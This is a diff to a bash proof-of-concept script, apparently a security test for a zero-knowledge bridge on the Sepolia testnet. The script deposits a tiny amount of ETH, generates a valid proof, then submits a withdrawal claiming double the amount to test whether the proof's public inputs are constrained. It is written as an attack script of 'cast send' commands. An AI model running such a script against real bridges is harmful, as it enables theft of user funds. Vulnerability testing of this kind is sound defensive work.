@@ -7,8 +7,8 @@
 # Attack Scenario:
 # 1. Attacker makes a small deposit (0.001 ETH)
 # 2. Attacker generates a valid proof for the 0.001 ETH deposit
-# 3. Attacker modifies the proof's public instances to claim 1 ETH (1000x more!)
-# 4. Attacker attempts to withdraw 1 ETH using the modified proof
+# 3. Attacker modifies the proof's public instances to claim 0.002 ETH (2x more!)
+# 4. Attacker attempts to withdraw 0.002 ETH using the modified proof
 #
 # Expected Result:
 # - If BC-CIRCUIT-004 is valid (instances not constrained): Withdrawal succeeds - CRITICAL VULNERABILITY!
@@ -72,13 +72,13 @@ echo "  Bridge: $BRIDGE_ADDRESS"
 echo "  Verifier: $VERIFIER_ADDRESS"
 echo ""
 
-# Step 2: Make a SMALL deposit (0.001 ETH)
-echo -e "${YELLOW}[2/7] Making Small Deposit (0.001 ETH)...${NC}"
+# Step 2: Make a SMALL deposit (0.00001 ETH)
+echo -e "${YELLOW}[2/7] Making Small Deposit (0.00001 ETH)...${NC}"
 
-ORIGINAL_AMOUNT="1000000000000000"  # 0.001 ETH in wei
-STOLEN_AMOUNT="1000000000000000000"  # 1 ETH in wei (1000x more!)
+ORIGINAL_AMOUNT="10000000000000"  # 0.00001 ETH in wei (0.001 ETH / 100)
+STOLEN_AMOUNT="20000000000000"  # 0.00002 ETH in wei (2x more - enough to bypass InsufficientTreasury)
 
-echo "Depositing 0.001 ETH to bridge..."
+echo "Depositing 0.00001 ETH to bridge..."
 DEPOSIT_TX=$(cast send "$BRIDGE_ADDRESS" \
     "deposit()" \
     --value "$ORIGINAL_AMOUNT" \
@@ -95,7 +95,7 @@ fi
 
 echo -e "${GREEN}✓ Deposit transaction sent!${NC}"
 echo "  TX Hash: $DEPOSIT_TX_HASH"
-echo "  Amount: 0.001 ETH"
+echo "  Amount: 0.00001 ETH"
 
 # Wait for transaction to be mined
 echo "Waiting for transaction to be mined..."
@@ -128,8 +128,8 @@ cargo run --release --example fetch_deposit_data -- \
 echo -e "${GREEN}✓ Event data fetched!${NC}"
 echo ""
 
-# Step 4: Generate VALID proof for 0.001 ETH deposit
-echo -e "${YELLOW}[4/7] Generating Valid Proof for 0.001 ETH Deposit...${NC}"
+# Step 4: Generate VALID proof for 0.00001 ETH deposit
+echo -e "${YELLOW}[4/7] Generating Valid Proof for 0.00001 ETH Deposit...${NC}"
 
 echo "Generating SNARK proof (this may take several minutes)..."
 cargo run --release --example test_with_real_data -- \
@@ -139,7 +139,7 @@ cargo run --release --example test_with_real_data -- \
     --max-data-byte-len 1024
 
 echo -e "${GREEN}✓ Valid proof generated!${NC}"
-echo "  Proof proves: 0.001 ETH deposit"
+echo "  Proof proves: 0.00001 ETH deposit"
 echo ""
 
 # Step 5: ATTACK - Modify public instances to claim 1 ETH
@@ -153,9 +153,9 @@ SENDER_ADDRESS=$(cast wallet address "$PRIVATE_KEY")
 
 echo -e "${RED}Attacker is attempting to steal funds!${NC}"
 echo ""
-echo "  Original deposit: 0.001 ETH ($ORIGINAL_AMOUNT wei)"
-echo "  Attacker claims:  1 ETH ($STOLEN_AMOUNT wei)"
-echo "  Theft multiplier: 1000x"
+echo "  Original deposit: 0.00001 ETH ($ORIGINAL_AMOUNT wei)"
+echo "  Attacker claims:  0.00002 ETH ($STOLEN_AMOUNT wei)"
+echo "  Theft multiplier: 2x"
 echo ""
 echo -e "${YELLOW}Creating malicious public inputs with modified amount...${NC}"
 
@@ -171,18 +171,19 @@ echo -e "${MAGENTA}[6/7] 🚨 Attempting Withdrawal with Modified Amount...${NC}
 cd "$CONTRACTS_DIR"
 
 echo "Submitting withdrawal transaction with STOLEN amount..."
-echo "  Using valid proof for 0.001 ETH"
-echo "  But claiming 1 ETH in public inputs"
+echo "  Using valid proof for 0.00001 ETH"
+echo "  But claiming 0.00002 ETH in public inputs"
 echo ""
 
 # This should FAIL if public instances are properly constrained
 set +e  # Don't exit on error - we expect this to fail
 
 WITHDRAW_TX=$(cast send "$BRIDGE_ADDRESS" \
-    "withdraw(address,uint256,uint256,bytes)" \
+    "withdraw(address,uint256,uint256,uint256,bytes)" \
     "$SENDER_ADDRESS" \
     "$STOLEN_AMOUNT" \
     "$DEPOSIT_ID" \
+    "$BLOCK_NUMBER" \
     "$VALID_PROOF_BYTES" \
     --rpc-url "$SEPOLIA_RPC_URL" \
     --private-key "$PRIVATE_KEY" \
@@ -202,10 +203,10 @@ else
     echo "  TX Hash: $WITHDRAW_TX_HASH"
     echo "Waiting for confirmation..."
     sleep 10
-    
+
     WITHDRAW_RECEIPT=$(cast receipt "$WITHDRAW_TX_HASH" --rpc-url "$SEPOLIA_RPC_URL" --json)
     WITHDRAW_STATUS=$(echo "$WITHDRAW_RECEIPT" | jq -r '.status')
-    
+
     if [ "$WITHDRAW_STATUS" = "0x1" ]; then
         # Transaction succeeded - CRITICAL VULNERABILITY!
         ATTACK_BLOCKED=false
@@ -240,8 +241,8 @@ if [ "$ATTACK_BLOCKED" = true ]; then
     echo "amount or any other public instance value."
     echo ""
     echo "Technical explanation:"
-    echo "  • The proof was generated for amount = 0.001 ETH"
-    echo "  • Attacker tried to claim amount = 1 ETH"
+    echo "  • The proof was generated for amount = 0.00001 ETH"
+    echo "  • Attacker tried to claim amount = 0.00002 ETH"
     echo "  • Halo2's verification checked that proof.instances == provided.instances"
     echo "  • Verification FAILED because instances don't match"
     echo "  • The bridge is SECURE against this attack vector"
